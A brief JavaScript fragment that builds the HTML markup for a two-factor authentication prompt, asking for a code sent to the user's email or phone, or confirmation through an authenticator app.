    ...
    const content = `
        <div class="flex flex-col h-full justify-between">
            <div>
                ...
                <p class="text-[#9a979e] text-sm mb-4">Enter the code for this account that we send to ${emailDisplay}, ${phoneDisplay}  or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)</p>
